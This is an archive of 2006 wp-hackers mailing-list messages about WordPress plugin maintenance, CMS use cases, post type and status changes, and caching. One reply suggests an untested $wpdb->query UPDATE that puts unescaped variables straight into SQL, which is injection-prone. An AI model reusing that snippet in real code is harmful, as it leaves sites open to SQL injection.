> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>

From ryan at boren.nu  Wed Feb  8 02:32:00 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 02:33:35 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E95249.9050903@skippy.net>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>	<43E948DA.9030906@boren.nu>	<43E94C0A.8020109@midnightcircus.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
Message-ID: <43E95820.7050803@boren.nu>

Scott Merrill wrote:
> I can see this developing somewhat akin to the Debian maintainer
> process.  The Debian maintainers apply patches and modify projects in
> ways to ensure compliance and compatibility with the Debian core.  They
> submit patches upstream, and upgrade their managed versions as needed.
> 
> What's being proposed is not an easy undertaking.  Plugin maintainership
> will require _a lot_ of time initially, due to code reviews and testing.
> It'll require more time as plugins evolve, and the code needs to be
> re-reviewed.  Bug reports from users will need to be sent upstream, etc etc.
> 
> I agree that the notification of problems resulting from core changes is
> a huge benefit.  I'd like to see these core changes announced somewhere
> other than just trac tickets, so that the fringe developers can still
> benefit from the information.

Yes, changes that we know will affect plugins should be announced.  Of 
course, most of the incompatibilities we don't know about until a plugin 
breaks.

After announcing, attentive plugin authors will have the opportunity to 
add compatibility to their plugins.  Plugins that are not fixed by the 
author after a certain time will be fixed by a gardener prior to release 
so that the user isn't left with broken bits.

Ryan


From sam at rephrase.net  Wed Feb  8 03:22:34 2006
From: sam at rephrase.net (Sam Angove)
Date: Wed Feb  8 03:24:04 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E95820.7050803@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com> <43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com> <43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net> <43E95820.7050803@boren.nu>
Message-ID: <aa74b1910602071922n72b12353p6dc951cacdb44299@mail.gmail.com>

On 2/8/06, Ryan Boren <ryan@boren.nu> wrote:
>
> Yes, changes that we know will affect plugins should be announced.  Of
> course, most of the incompatibilities we don't know about until a plugin
> breaks.
>
> After announcing, attentive plugin authors will have the opportunity to
> add compatibility to their plugins.  Plugins that are not fixed by the
> author after a certain time will be fixed by a gardener prior to release
> so that the user isn't left with broken bits.

I'd prefer not "announced" so much as "sent directly as an email alert
at the RC stage", and with information phrased not as "the user system
has been overhauled" but as "if your plugin uses the $user_level
global, it is now broken." Maybe personalized with specific details of
things found by the magic deprecated-function scanner script.

A web-accessible version of said script would also be nice. Like the
W3C validators.

Letting plugin authors use a file upload system a la
addons.mozilla.org -- rather than jumping through hoops emailing Matt,
*learning how to use Subversion* etc. -- would greatly spur adoption.

Anyway, not much point talking about it. Build it and they will come... ;)


[Sorry if this sends twice. Gmail is misbehaving.]
From m at mullenweg.com  Wed Feb  8 04:40:17 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Feb  8 04:42:22 2006
Subject: [wp-hackers] WP as CMS examples
Message-ID: <43E97631.2040907@mullenweg.com>

What are your favorite examples of WordPress being used for something 
other than a blog, primarily? Feel free to toot your own horn.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From r at schestowitz.com  Wed Feb  8 05:51:22 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Wed Feb  8 05:50:29 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <43E97631.2040907@mullenweg.com>
References: <43E97631.2040907@mullenweg.com>
Message-ID: <20060208055122.ywo2gd7b6nms04w8@banana.catalyst2.com>

_____/ On Wed 08 Feb 2006 04:40:17 GMT, [Matt Mullenweg] wrote : \_____

> What are your favorite examples of WordPress being used for something 
> other than a blog, primarily? Feel free to toot your own horn.

Apart from heavily-hacked WordPress like < http://www.kingdesign.net/ >,
WordPress can be officially used to reflect on project development and
downloads of nightlies < http://www.squarefree.com/burningedge/ >. Mozilla
Firefox has used WordPress for at least 6 months.

I choose mention this particular aspect because it involves 'out of the box'
WordPress. It illustrates the point that WordPress can serve a non-blogger
without programming inclinations.

With kind regards,

Roy

-- 
Roy S. Schestowitz      |    Useless fact: Florida is bigger than England
http://Schestowitz.com  |    SuSE Linux     |     PGP-Key: 0x74572E8E
  5:40am  up 22 days  0:56,  11 users,  load average: 0.21, 0.60, 0.67
      http://iuron.com - next generation of search paradigms

From ryan at boren.nu  Wed Feb  8 06:06:04 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 06:07:38 2006
Subject: [wp-hackers] post_status and post_type
Message-ID: <1139378764.5565.12.camel@localhost.localdomain>

Currently, post_status contains both type and status information.  A
status of 'publish', 'private', or 'draft' has an assumed type of
'post'.  A status of 'static' assumes a type of 'page' and a status of
'publish'.  There is currently no way to have a page that has a status
other than 'publish'.

No longer.  The attached patch provides for a post_type of 'post',
'page', or 'attachment' and a post_status of 'publish', 'private',
'draft', or 'inherit'.  This allows a 'page' to have any status, which
was previously not possible.  "Write->Page" and "Manage->Pages"  now
have a "Page Status" radio box.  The page queries need to be looked over
to make sure they are showing only published pages where appropriate.
wp_list_pages() already excludes non-published pages.

This will surely break some plugins.  We can write some compatibility
code that plugins can include to help them deal with the change.  While
doing that, I'd like to audit queries done by plugins and see which ones
would make good candidates for inclusion in WP core abstracted behind a
function call.

Ryan


From false.hopes at gmail.com  Wed Feb  8 06:34:24 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Feb  8 06:35:54 2006
Subject: [wp-hackers] Re: Simplicity in 2.next
In-Reply-To: <aa74b1910602071922n72b12353p6dc951cacdb44299@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<43E8E647.6000105@midnightcircus.com> <43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com> <43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net> <43E95820.7050803@boren.nu>
	<aa74b1910602071922n72b12353p6dc951cacdb44299@mail.gmail.com>
Message-ID: <a491f91d0602072234i2fb12675w24d148c9a04685ee@mail.gmail.com>

Personally, I am still failing to see the purpose behind "Plugin
Gardeners." Much of the argument for them has been that many plugins
are old and unmaintained, so sure, it sounds like a great idea for
some talented authors to fix them. But what about releases? If the
plugins are as unmaintained as it sounds to the point where an author
can't be contacted to fix his or her own plugin, what point is there
in even committing fixes to the plugin itself, unless the WordPress
team is going to come out and say here's a list of plugins and the
downloads for them that are fixed for the next version of WordPress,
and are not guaranteed by the original author. Not only does this
worsen the load on plugin gardeners because suddenly people think that
along with the re-release of these plugins, it means they will get
some real support, but also that we now have irritated plugin authors
upset because, like mentioned before, we stole their traffic.

If there is something obvious I'm missing here, please let me know, as
this sounds like an idea I would like to love, but it has too many
problems to be a solution in itself to a much simpler problem.

--
--Robert Deaton
http://somethingunpredictable.com
From m at mullenweg.com  Wed Feb  8 07:38:43 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Feb  8 07:40:52 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E94C0A.8020109@midnightcircus.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>
	<43E948DA.9030906@boren.nu> <43E94C0A.8020109@midnightcircus.com>
Message-ID: <43E9A003.4060307@mullenweg.com>

Owen Winkler wrote:
> It's not an invalid advantage by any stretch.  And yet, in an 
> environment with two primary committers with deific control over the 
> core repo, you can see how I would feel oddly about this.

Damn, you're right! Go use Drupal. Oh wait, they have a central modules 
repository:

http://cvs.drupal.org/viewcvs/drupal/contributions/modules/

And two "deific" developers who do all the committing to core.

Go use Mambo! Oh wait...

Almost every open source project I can think of has implemented 
something similar to this, and each has benefited from it. Linux distros 
do it too.

We're not promoting plugins from the main site now, obviously this is a 
goal. You seem to be concerned about losing traffic to your site/ads if 
people can download plugins from one place (like they want) rather than 
going to 30 different sites each with their own UI. (Apologies if I'm 
misunderstanding some of your concerns.)

WordPress.org has done 1.2 *million* pageviews this week. If just 1% of 
that traffic trickled your way, would that help your stats? I'm all for 
promoting plugin and theme authors, and have been from the beginning.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From m at mullenweg.com  Wed Feb  8 07:42:34 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Feb  8 07:44:43 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E95820.7050803@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>	<43E948DA.9030906@boren.nu>	<43E94C0A.8020109@midnightcircus.com>	<43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net> <43E95820.7050803@boren.nu>
Message-ID: <43E9A0EA.6080606@mullenweg.com>

Ryan Boren wrote:
> After announcing, attentive plugin authors will have the opportunity to 
> add compatibility to their plugins.  Plugins that are not fixed by the 
> author after a certain time will be fixed by a gardener prior to release 
> so that the user isn't left with broken bits.

Or better yet, we have everyone's email (SSO with wordpress.org) so why 
not just ping them directly and only make a change if they're MIA.

It would also be great to have the XML-RPC api call that showed plugin 
usage so we could have real stats on what plugin to prioritize.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From ryan at boren.nu  Wed Feb  8 07:47:08 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 07:48:43 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E9A0EA.6080606@mullenweg.com>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com>	<43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com>	<43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net> <43E95820.7050803@boren.nu>
	<43E9A0EA.6080606@mullenweg.com>
Message-ID: <1139384828.5565.19.camel@localhost.localdomain>

On Tue, 2006-02-07 at 23:42 -0800, Matt Mullenweg wrote:
> Ryan Boren wrote:
> > After announcing, attentive plugin authors will have the opportunity to 
> > add compatibility to their plugins.  Plugins that are not fixed by the 
> > author after a certain time will be fixed by a gardener prior to release 
> > so that the user isn't left with broken bits.
> 
> Or better yet, we have everyone's email (SSO with wordpress.org) so why 
> not just ping them directly and only make a change if they're MIA.
> 
> It would also be great to have the XML-RPC api call that showed plugin 
> usage so we could have real stats on what plugin to prioritize.

Right.  The best situation is where we could get a patch upstreamed to
the original author.  But if they're unresponsive, we need to be able to
commit a fix that will allow people to upgrade.  Think linux distro
model.

Ryan

From m at mullenweg.com  Wed Feb  8 07:49:00 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Feb  8 07:51:11 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <20060208055122.ywo2gd7b6nms04w8@banana.catalyst2.com>
References: <43E97631.2040907@mullenweg.com>
	<20060208055122.ywo2gd7b6nms04w8@banana.catalyst2.com>
Message-ID: <43E9A26C.8090501@mullenweg.com>

Roy Schestowitz wrote:
> Apart from heavily-hacked WordPress like < http://www.kingdesign.net/ >,
> WordPress can be officially used to reflect on project development and
> downloads of nightlies < http://www.squarefree.com/burningedge/ >. Mozilla
> Firefox has used WordPress for at least 6 months.

Alex's site is great, thanks for pointing that out.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From lists at alexking.org  Wed Feb  8 08:09:23 2006
From: lists at alexking.org (Alex King)
Date: Wed Feb  8 08:10:52 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <43E9A26C.8090501@mullenweg.com>
References: <43E97631.2040907@mullenweg.com>
	<20060208055122.ywo2gd7b6nms04w8@banana.catalyst2.com>
	<43E9A26C.8090501@mullenweg.com>
Message-ID: <E365A192-281B-4E56-B8BF-508FF8913B05@alexking.org>

Thanks guys. I wanted to point out that the FeedLounge web site runs  
nearly exclusively on WP (with PunBB for the forums and a custom  
script for feature voting), and isn't nearly as "hacked" as my King  
Design site is. I think the only thing I've really customized  
(besides the theme and a couple of plugins) is not allowing WP to  
update the mod_rewrite rules and handling those by hand.

It would be hard to convince me *not* to build a site on WP these  
days. :)

Cheers,
--Alex King

Personal             Business               FeedLounge
http://alexking.org  http://kingdesign.net  http://feedlounge.com




On Feb 8, 2006, at 12:49 AM, Matt Mullenweg wrote:

> Roy Schestowitz wrote:
>> Apart from heavily-hacked WordPress like < http:// 
>> www.kingdesign.net/ >,
>
> Alex's site is great, thanks for pointing that out.
From mani.monajjemi at gmail.com  Wed Feb  8 08:40:34 2006
From: mani.monajjemi at gmail.com (Mani Monajjemi)
Date: Wed Feb  8 08:42:07 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <E365A192-281B-4E56-B8BF-508FF8913B05@alexking.org>
References: <43E97631.2040907@mullenweg.com>
	<20060208055122.ywo2gd7b6nms04w8@banana.catalyst2.com>
	<43E9A26C.8090501@mullenweg.com>
	<E365A192-281B-4E56-B8BF-508FF8913B05@alexking.org>
Message-ID: <d4d3e29e0602080040j37ea8483i5baf57be38dbe7b7@mail.gmail.com>

well , here is an example in other language : www.sayeban.org , it's in
persian , but it uses WP as a CMS.

On 2/8/06, Alex King <lists@alexking.org> wrote:
>
> Thanks guys. I wanted to point out that the FeedLounge web site runs
> nearly exclusively on WP (with PunBB for the forums and a custom
> script for feature voting), and isn't nearly as "hacked" as my King
> Design site is. I think the only thing I've really customized
> (besides the theme and a couple of plugins) is not allowing WP to
> update the mod_rewrite rules and handling those by hand.
>
> It would be hard to convince me *not* to build a site on WP these
> days. :)
>
> Cheers,
> --Alex King
>
> Personal             Business               FeedLounge
> http://alexking.org  http://kingdesign.net  http://feedlounge.com
>
>
>
>
> On Feb 8, 2006, at 12:49 AM, Matt Mullenweg wrote:
>
> > Roy Schestowitz wrote:
> >> Apart from heavily-hacked WordPress like < http://
> >> www.kingdesign.net/ >,
> >
> > Alex's site is great, thanks for pointing that out.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
Mani Monajjemi
www.manionline.org
From silkjaer at theundersigned.net  Wed Feb  8 08:45:39 2006
From: silkjaer at theundersigned.net (=?ISO-8859-1?Q?Thomas_Silkj=E6r?=)
Date: Wed Feb  8 08:47:32 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <d4d3e29e0602080040j37ea8483i5baf57be38dbe7b7@mail.gmail.com>
References: <43E97631.2040907@mullenweg.com>
	<20060208055122.ywo2gd7b6nms04w8@banana.catalyst2.com>
	<43E9A26C.8090501@mullenweg.com>
	<E365A192-281B-4E56-B8BF-508FF8913B05@alexking.org>
	<d4d3e29e0602080040j37ea8483i5baf57be38dbe7b7@mail.gmail.com>
Message-ID: <114AFC52-D628-4A04-ABB4-A7AC071C7C7A@theundersigned.net>

I use it for www.theundersigned.net and www.theundersigned.net/book

/Thomas


Den 08/02/2006 kl. 9.40 skrev Mani Monajjemi:

> well , here is an example in other language : www.sayeban.org ,  
> it's in
> persian , but it uses WP as a CMS.
>
> On 2/8/06, Alex King <lists@alexking.org> wrote:
>>
>> Thanks guys. I wanted to point out that the FeedLounge web site runs
>> nearly exclusively on WP (with PunBB for the forums and a custom
>> script for feature voting), and isn't nearly as "hacked" as my King
>> Design site is. I think the only thing I've really customized
>> (besides the theme and a couple of plugins) is not allowing WP to
>> update the mod_rewrite rules and handling those by hand.
>>
>> It would be hard to convince me *not* to build a site on WP these
>> days. :)
>>
>> Cheers,
>> --Alex King
>>
>> Personal             Business               FeedLounge
>> http://alexking.org  http://kingdesign.net  http://feedlounge.com
>>
>>
>>
>>
>> On Feb 8, 2006, at 12:49 AM, Matt Mullenweg wrote:
>>
>>> Roy Schestowitz wrote:
>>>> Apart from heavily-hacked WordPress like < http://
>>>> www.kingdesign.net/ >,
>>>
>>> Alex's site is great, thanks for pointing that out.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers@lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Mani Monajjemi
> www.manionline.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From nuclearmoose at gmail.com  Wed Feb  8 08:46:18 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Feb  8 08:47:49 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <43E97631.2040907@mullenweg.com>
References: <43E97631.2040907@mullenweg.com>
Message-ID: <5aa3aa0602080046x7bc87b6cy9a0e348e34c1dc5a@mail.gmail.com>

Personally I'm very interested in using a CMS-like version of WP to manage
some local sports leagues. The minor baseball, soccer and hockey
organizations would all benefit from this immensely.

Craig.
From peter.westwood at ftwr.co.uk  Wed Feb  8 08:53:32 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed Feb  8 08:55:09 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <43E97631.2040907@mullenweg.com>
References: <43E97631.2040907@mullenweg.com>
Message-ID: <38159.127.0.0.1.1139388812.squirrel@epia.ftwr.co.uk>


On Wed, February 8, 2006 4:40 am, Matt Mullenweg wrote:
> What are your favorite examples of WordPress being used for something
> other than a blog, primarily? Feel free to toot your own horn.
>

I am currently using it for http://www.costaricabikeride.org and working
on replacing the outdated design at http://www.pompe.org.uk with a
WordPress powered site

westi
-- 
Peter Westwood
Blog: http://blog.ftwr.co.uk

From mark at phunky.co.uk  Wed Feb  8 09:23:01 2006
From: mark at phunky.co.uk (Mark Harwood)
Date: Wed Feb  8 09:22:46 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <38159.127.0.0.1.1139388812.squirrel@epia.ftwr.co.uk>
References: <43E97631.2040907@mullenweg.com>
	<38159.127.0.0.1.1139388812.squirrel@epia.ftwr.co.uk>
Message-ID: <43E9B875.9090904@phunky.co.uk>

Well ive got quite a list of sites based apon wordpress, used it for our 
extranet, for a online store for reseller of our stairlifts. But these 
are not open to public viewing.

heres a few URL's

www.jamesjakes.com
www.teamaka.co.uk
www.eurocss.net

WP is now the base of all my sites.
From r at schestowitz.com  Wed Feb  8 09:36:19 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Wed Feb  8 09:35:23 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <5aa3aa0602080046x7bc87b6cy9a0e348e34c1dc5a@mail.gmail.com>
References: <43E97631.2040907@mullenweg.com>
	<5aa3aa0602080046x7bc87b6cy9a0e348e34c1dc5a@mail.gmail.com>
Message-ID: <20060208093619.curxbcvasa8skk88@banana.catalyst2.com>

_____/ On Wed 08 Feb 2006 08:46:18 GMT, [Craig] wrote : \_____

> Personally I'm very interested in using a CMS-like version of WP to manage
> some local sports leagues. The minor baseball, soccer and hockey
> organizations would all benefit from this immensely.

Have a look at DragonFly CMS. It is quite a decent 'off-the-shelf' package
which can handle many different aspects that commercial content management
systems address. It is actually a PHP CPGNuke derivative.

It integrates the WordPress, the Coppermine Photo Gallery, and phpBB. It's a
little hard to administer, but should be rather stable and reliable. Your
mileage may vary nonetheless.

With kind regards,

Roy

-- 
Roy S. Schestowitz
http://Schestowitz.com  |    SuSE Linux     |     PGP-Key: 0x74572E8E
  9:25am  up 22 days  4:41,  12 users,  load average: 0.52, 0.69, 0.68

From choan.galvez at gmail.com  Wed Feb  8 10:04:05 2006
From: choan.galvez at gmail.com (=?UTF-8?Q?Choan_C=2E_G=C3=A1lvez?=)
Date: Wed Feb  8 10:05:36 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <1139378764.5565.12.camel@localhost.localdomain>
References: <1139378764.5565.12.camel@localhost.localdomain>
Message-ID: <34dea5010602080204k6c8ea739x@mail.gmail.com>

On 08/02/06, Ryan Boren <ryan@boren.nu> wrote:
> Currently, post_status contains both type and status information.  A
> status of 'publish', 'private', or 'draft' has an assumed type of
> 'post'.  A status of 'static' assumes a type of 'page' and a status of
> 'publish'.  There is currently no way to have a page that has a status
> other than 'publish'.
>
> No longer.  The attached patch provides for a post_type of 'post',
> 'page', or 'attachment' and a post_status of 'publish', 'private',
> 'draft', or 'inherit'.

That's great! The impossibility of creating unpublished pages has been
(for me) the great stopper to use WP as my clients' CMS.

Could it go into 2.0.2?

> This allows a 'page' to have any status, which
> was previously not possible.  "Write->Page" and "Manage->Pages"  now
> have a "Page Status" radio box.  The page queries need to be looked over
> to make sure they are showing only published pages where appropriate.
> wp_list_pages() already excludes non-published pages.
>
> This will surely break some plugins.  We can write some compatibility
> code that plugins can include to help them deal with the change.  While
> doing that, I'd like to audit queries done by plugins and see which ones
> would make good candidates for inclusion in WP core abstracted behind a
> function call.

Yep, that'll be good.

By the way, no attachment.

--
Choan
From nuclearmoose at gmail.com  Wed Feb  8 10:23:10 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Feb  8 10:24:39 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <20060208093619.curxbcvasa8skk88@banana.catalyst2.com>
References: <43E97631.2040907@mullenweg.com>
	<5aa3aa0602080046x7bc87b6cy9a0e348e34c1dc5a@mail.gmail.com>
	<20060208093619.curxbcvasa8skk88@banana.catalyst2.com>
Message-ID: <5aa3aa0602080223j2550d961ufdb199d8cf0116c8@mail.gmail.com>

Roy,
Thank you for the information.
Craig.
From newsletter at scytheman.net  Wed Feb  8 10:36:51 2006
From: newsletter at scytheman.net (Sebastian Herp)
Date: Wed Feb  8 10:38:30 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <00b801c62c29$55a9f200$6e01a8c0@sixfour>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>	<43E8D163.1010308@scytheman.net>
	<00b801c62c29$55a9f200$6e01a8c0@sixfour>
Message-ID: <43E9C9C3.7090402@scytheman.net>

David Chait wrote:
> Have you tried WP-Cache on your system?  Most of what you discuss would be 
> solved with WP-Cache built-in to WP in the future (on an option, of course).
>
>   
Yes, I tried WP-Cache. It does not speed up things versus Staticize 
Reloaded and even the later one modified to store the files in the 
database itself is fast enough (around 80 ms for every request). And 
yes, it is the ideal solution with some restrictions. Nothing some 
modifications shouldn't fix ;-)
From wphackers at jamietalbot.com  Wed Feb  8 10:41:23 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Wed Feb  8 10:43:03 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <43E8D163.1010308@scytheman.net>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
	<43E8D163.1010308@scytheman.net>
Message-ID: <43E9CAD3.6070305@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sebastian Herp wrote:

<snip>

> 3. don't filter the content of posts/comments each time they are
> displayed, instead do it on updates of the content only (the columns for
> that exist in the database) This should also be core and not solved with
> a plugin!

Some nice ideas there, +1 especially for removing now(), but we can't really do 3. because that
would break the ability to create filters that work based on the current time, or other
run-time-available-only information.

Jamie.


- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD6crTrovxfShShFARAn94AJ9tOyux3dgNsYK8tWiACYdsacS0nQCeJENj
f65SEZPioPMBZELbdql311M=
=20C/
-----END PGP SIGNATURE-----
From wphackers at jamietalbot.com  Wed Feb  8 10:48:37 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Wed Feb  8 10:50:14 2006
Subject: [wp-hackers] update_user_option() Not quite working right.
In-Reply-To: <43E8CB11.3040606@phunky.co.uk>
References: <43E8CB11.3040606@phunky.co.uk>
Message-ID: <43E9CC85.8050904@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Mark Harwood wrote:
> Any ideas how we to just change the feilds in wp_user instead of having
> update_user_option() add them into the wp_usermeta table?
> 

There may be better solutions, but why not just update the database yourself with a direct database
call yourself?

Something like:

$wpdb->query("UPDATE $wpdb->users SET user_email = '$myemail' WHERE ID = $userid LIMIT 1")

(Untested!)

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD6cyFrovxfShShFARAnPxAKCTWCmyehxok27HvBBVBjCefI27rgCgkR2e
BDx8dIQ8+syp+RDO3zTsysE=
=ljDU
-----END PGP SIGNATURE-----
From newsletter at scytheman.net  Wed Feb  8 10:53:46 2006
From: newsletter at scytheman.net (Sebastian Herp)
Date: Wed Feb  8 10:55:20 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <43E9CAD3.6070305@jamietalbot.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>	<43E8D163.1010308@scytheman.net>
	<43E9CAD3.6070305@jamietalbot.com>
Message-ID: <43E9CDBA.1060206@scytheman.net>

Jamie Talbot wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> Sebastian Herp wrote:
>
> <snip>
>
>   
>> 3. don't filter the content of posts/comments each time they are
>> displayed, instead do it on updates of the content only (the columns for
>> that exist in the database) This should also be core and not solved with
>> a plugin!
>>     
>
> Some nice ideas there, +1 especially for removing now(), but we can't really do 3. because that
> would break the ability to create filters that work based on the current time, or other
> run-time-available-only information.
>   

That's true. But those filters could still be executed on the 
"pre-rendered" content. But plugins like dofollow, textile, markdown, 
external link finders, etc do not need to filter the content every time 
it's displayed, do they?
From mark at phunky.co.uk  Wed Feb  8 10:56:15 2006
From: mark at phunky.co.uk (Mark Harwood)
Date: Wed Feb  8 10:55:50 2006
Subject: [wp-hackers] update_user_option() Not quite working right.
In-Reply-To: <43E9CC85.8050904@jamietalbot.com>
References: <43E8CB11.3040606@phunky.co.uk> <43E9CC85.8050904@jamietalbot.com>
Message-ID: <43E9CE4F.7000006@phunky.co.uk>

yeah i wanted to try and keep to as many WP functions as possible, but 
it would seem that ive been unable to do so.

So ive just gone ahead with using $wpdb->query

Thanks tho

Jamie Talbot wrote:

>-----BEGIN PGP SIGNED MESSAGE-----
>Hash: SHA1
>
>Mark Harwood wrote:
>  
>
>>Any ideas how we to just change the feilds in wp_user instead of having
>>update_user_option() add them into the wp_usermeta table?
>>
>>    
>>
>
>There may be better solutions, but why not just update the database yourself with a direct database
>call yourself?
>
>Something like:
>
>$wpdb->query("UPDATE $wpdb->users SET user_email = '$myemail' WHERE ID = $userid LIMIT 1")
>
>(Untested!)
>
>Jamie.
>
>- --
>http://jamietalbot.com
>-----BEGIN PGP SIGNATURE-----
>Version: GnuPG v1.2.5 (MingW32)
>Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
>
>iD8DBQFD6cyFrovxfShShFARAnPxAKCTWCmyehxok27HvBBVBjCefI27rgCgkR2e
